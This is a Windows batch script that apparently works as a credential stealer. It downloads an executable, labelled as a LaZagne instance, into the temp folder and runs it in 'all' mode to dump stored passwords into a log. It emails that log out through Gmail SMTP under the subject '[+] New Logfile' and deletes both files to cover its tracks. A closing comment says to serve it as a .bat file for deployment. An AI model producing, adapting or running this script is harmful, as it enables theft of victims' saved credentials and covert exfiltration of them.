@echo off

set downloadURL=laZagneInstanceHere
set email=email@email.com
set password=password

set exeFile=%TEMP%\proc.exe
set logFile=%TEMP%\proclog.txt
set arguments=all

powershell {new-object System.Net.WebClient }.DownloadFile('%downloadURL%', '%exeFile%');
%exeFile% %arguments% > %logFile%

del %exeFile%

powershell $to = %email%;$password = %password%;$subject = '[+] New Logfile';$body = %logfile%;$attachment = %logfile%;$message = New-Object System.Net.Mail.MailMessage;$message.subject = $subject;$message.body = $body;$message.to.add($to);$message.from = $to;$message.attachments.add($attachment)

powershell $SMTPServer = 'smtp.gmail.com';$SMTPClient = New-Object Net.Mail.SmtpClient($SMTPServer, 587);$SMTPClient.EnableSsl = $true; $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($to, %password%);$SMTPClient.send($message)

del %logFile%

# serve as .bat file for proper deployment